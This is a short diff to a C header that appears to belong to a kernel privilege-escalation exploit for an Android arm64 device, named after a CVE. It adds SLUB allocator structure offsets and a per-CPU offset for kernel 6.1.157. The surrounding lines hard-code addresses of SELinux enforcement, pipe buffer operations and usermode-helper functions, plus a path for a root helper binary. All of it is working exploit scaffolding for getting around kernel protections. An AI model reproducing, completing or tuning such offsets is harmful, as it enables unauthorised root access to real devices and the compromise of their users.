@@ -193,6 +193,18 @@
 #define SELINUX_ENFORCING_OFF 0x025c92f8ULL
 #define KMALLOC_CACHES_OFF 0x01792ed8ULL
 #define ANON_PIPE_BUF_OPS_OFF 0x0120c610ULL
+/* SLUB lookup path, BTF vmlinux.btf (kernel 6.1.157):
+ *   struct kmem_cache      { struct kmem_cache_cpu *cpu_slab; ... }; 0x00
+ *   struct kmem_cache_cpu  { freelist 0x00, tid 0x08, slab 0x10,
+ *                            partial 0x18 };  (32 B)
+ *   struct kmem_cache_node { nr_partial 0x08, partial 0x10, ... }
+ *   struct slab            { slab_cache 0x18, freelist 0x20,
+ *                            counters 0x28, ... }
+ * __per_cpu_offset = 0xffffffc00a2cb650 - KIMAGE_TEXT_BASE = 0x022cb650. */
+#define KMEM_CACHE_CPU_SLAB_OFF 0x00ULL
+#define KMEM_CACHE_CPU_ACTIVE_OFF 0x10ULL
+#define KMEM_CACHE_CPU_PARTIAL_OFF 0x18ULL
+#define PER_CPU_OFFSET_OFF 0x022cb650ULL
 
 #define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
 #define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
@@ -211,6 +223,7 @@
 #define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
 #define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
 #define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
+#define PER_CPU_OFFSET (KIMAGE_TEXT_BASE + PER_CPU_OFFSET_OFF)
 
 #define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
 #define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d4360ULL
